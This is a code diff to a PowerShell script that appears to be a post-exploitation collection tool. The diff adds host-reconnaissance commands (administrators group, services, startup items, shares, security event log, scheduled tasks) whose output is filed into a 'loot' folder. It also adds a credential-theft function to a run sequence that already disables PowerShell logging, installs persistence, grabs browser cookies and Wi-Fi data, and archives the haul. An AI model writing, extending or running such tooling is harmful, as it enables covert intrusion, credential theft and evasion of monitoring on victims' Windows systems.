@@ -235,6 +235,7 @@ function Get-Data {
         # List of commands to execute
         $commands = @(
             "Get-LocalUser | Format-List",
+            "net localgroup administrators",
             "Get-ChildItem Cert:\CurrentUser\My | Format-List *",
             "Get-ChildItem Cert:\LocalMachine\My | Format-List *",
             "whoami",
@@ -248,10 +249,15 @@ function Get-Data {
             "nslookup .",
             "gpresult /R",
             "Get-WmiObject Win32_ComputerSystem",
+            "Get-WmiObject Win32_Service | Select-Object Name, DisplayName, State, PathName",
+            "Get-WmiObject Win32_StartupCommand",
             "Get-ComputerInfo | Select-Object *",
             "Get-Process -IncludeUserName | Select-Object ID, SI, ProcessName, UserName",
+            "Get-WmiObject Win32_Share",
             "ipconfig /all",
             "netstat -ano",
+            "Get-EventLog -LogName Security -Newest 50",
+            "Get-ScheduledTask | Select-Object TaskName, State, Actions",
             "Get-NetIPConfiguration -Detailed",
             "Get-NetIPAddress -AddressFamily IPv4 | Select-Object *",
             "Get-NetFirewallRule",
@@ -270,29 +276,36 @@ function Get-Data {
                     Write-ToErrorLog -errMsg $_ -errorLogFile $errorLogFile
                     continue
                 }
-                if ($command -match "ipconfig|netstat|Get-NetIPConfiguration|Get-NetIPAddress|Get-NetFirewallRule|nslookup") {
-                    $lootFile = "$($lootDir)\Networking\$($command -replace '[^a-zA-Z0-9]', '_').txt"
-                }
-                elseif ($command -match "AntiVirus|Get-MpComputerStatus") {
-                    $lootFile = "$($lootDir)\Antivirus\$($command -replace '[^a-zA-Z0-9]', '_').txt"
-                }
-                elseif ($command -match "gpresult") {
-                    $lootFile = "$($lootDir)\Gpo\gpresult.txt"
-                }
-                elseif ($command -match "Get-LocalUser|whoami|net users|net localgroup|Get-Process") {
-                    $lootFile = "$($lootDir)\UserInfo\$($command -replace '[^a-zA-Z0-9]', '_').txt"
-                }
-                elseif ($command -match "Cert") {
-                    $lootFile = if ($command -match "CurrentUser") {
-                        "$($lootDir)\Certificates\CurrentUser_Certificates.txt"
+
+                switch -Regex ($command) {
+                    "ipconfig|netstat|Get-NetIPConfiguration|Get-NetIPAddress|Get-NetFirewallRule|nslookup" {
+                        $lootFile = "$($lootDir)\Networking\$($command -replace '[^a-zA-Z0-9]', '_').txt"
                     }
-                    else {
-                        "$($lootDir)\Certificates\LocalMachine_Certificates.txt"
+                    "AntiVirus|Get-MpComputerStatus" {
+                        $lootFile = "$($lootDir)\Antivirus\$($command -replace '[^a-zA-Z0-9]', '_').txt"
+                    }
+                    "gpresult" {
+                        $lootFile = "$($lootDir)\Gpo\gpresult.txt"
+                    }
+                    "Get-LocalUser|whoami|net users|net localgroup|Get-Process|net localgroup" {
+                        $lootFile = "$($lootDir)\UserInfo\$($command -replace '[^a-zA-Z0-9]', '_').txt"
+                    }
+                    "Cert" {
+                        $lootFile = if ($command -match "CurrentUser") {
+                            "$($lootDir)\Certificates\CurrentUser_Certificates.txt"
+                        }
+                        else {
+                            "$($lootDir)\Certificates\LocalMachine_Certificates.txt"
+                        }
+                    }
+                    "Get-WmiObject Win32_ComputerSystem|Get-WmiObject Win32_Service|Get-WmiObject Win32_StartupCommand|Get-ComputerInfo|Get-Process|Get-WmiObject Win32_Share" {
+                        $lootFile = "$($lootDir)\SystemInfo\$($command -replace '[^a-zA-Z0-9]', '_').txt"
+                    }
+                    default {
+                        $lootFile = "$($lootDir)\SystemInfo\$($command -replace '[^a-zA-Z0-9]', '_').txt"
                     }
                 }
-                else {
-                    $lootFile = "$($lootDir)\SystemInfo\$($command -replace '[^a-zA-Z0-9]', '_').txt"
-                }
+
                 Add-Content -Path $lootFile -Value "Executed: $command`n"
                 Add-Content -Path $lootFile -Value ($output.Trim() + "`n")
             }
@@ -835,7 +848,7 @@ function Submit-DataCollection {
     # (Assuming the script content is saved in a .ps1 file and executed in PowerShell)
 #>
 $semaphore = [System.Threading.Semaphore]::new(1, 1)
-$functions = @("Disable-PowerShellLogging", "Add-WindowsPersistence", "Get-WebCookieFile", "Get-Data", "Get-PowerShellHistory", "Get-WifiData", "New-PowerShellSetup", 'New-CollectionArchive')
+$functions = @("Disable-PowerShellLogging", "Add-WindowsPersistence", "Get-Credentials", "Get-Data", "Get-WebCookieFile", "Get-PowerShellHistory", "Get-WifiData", "New-PowerShellSetup", 'New-CollectionArchive')
 foreach ($function in $functions) {
     $semaphore.WaitOne()
     try {
